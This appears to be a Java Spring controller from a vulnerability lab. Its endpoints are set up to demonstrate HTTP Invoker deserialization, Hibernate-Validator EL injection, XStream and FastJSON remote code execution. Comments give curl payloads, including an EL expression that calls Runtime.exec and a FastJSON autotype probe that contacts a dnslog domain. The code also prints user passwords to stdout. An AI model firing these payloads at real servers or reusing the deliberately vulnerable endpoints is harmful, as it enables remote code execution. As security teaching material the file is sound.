package org.example.Controller;

import org.example.User.IUserService;
import org.example.User.User;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.validation.Valid;

@Controller
public class TestController {

    //    远程方法调用http-invoker示例
    @RequestMapping(value = "/httpinvoker")
    public String httpInvokerTest(Model model) {
        ApplicationContext context=new ClassPathXmlApplicationContext("classpath:invoker-client.xml");
        IUserService userService=(IUserService) context.getBean("userServiceProxy");
        User user=userService.getUser();
        System.out.println(user.getUsername());
        System.out.println(user.getPassword());
        model.addAttribute("User", user);
        return "/user";
    }

    // 攻击http-invoker
    // curl http://localhost:8080/SpringConfigTest_war_exploded/remote/UserService --data-binary @test6.txt


    // Hibernate-Validator配置，EL注入
    // curl -X POST -d 'username=${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("open -a Calculator")}&password=123' http://localhost:8080/SpringConfigTest_war_exploded/validate
    // 添加ResponseBody可能出现415， 不添加BindingResult可能出现400
    @RequestMapping(value = "/validate")
    public String validateBody(@Valid User user, BindingResult bindingResult, Model model){
        System.out.println("validating");
        model.addAttribute("User", user);
        return "/user";
    }

    // Spring OXM配置，XStreamMarshaller造成RCE
    // curl -X POST -H 'Content-Type: application/xml' -d 'xxx' http://localhost:8080/SpringConfigTest_war_exploded/xstream
    @RequestMapping(value="/xstream", method= RequestMethod.POST, produces="application/xml")
    @ResponseBody
    public String receiveXml(@RequestBody String message) {
        System.out.println("xstream");
        return message;
    }


    // Spring OXM配置，FastJsonHttpMessageConverter造成RCE
    // curl -X POST -H 'Content-Type: application/json' -d '{"@type":"java.net.Inet4Address","val":"yqpgga.dnslog.cn"}' http://localhost:8080/SpringConfigTest_war_exploded/fastjson
    @RequestMapping(value="/fastjson", method= RequestMethod.POST, produces="application/json")
    @ResponseBody
    public String receiveJson(@RequestBody String message) {
        System.out.println("fastjson");
        return message;
    }

}
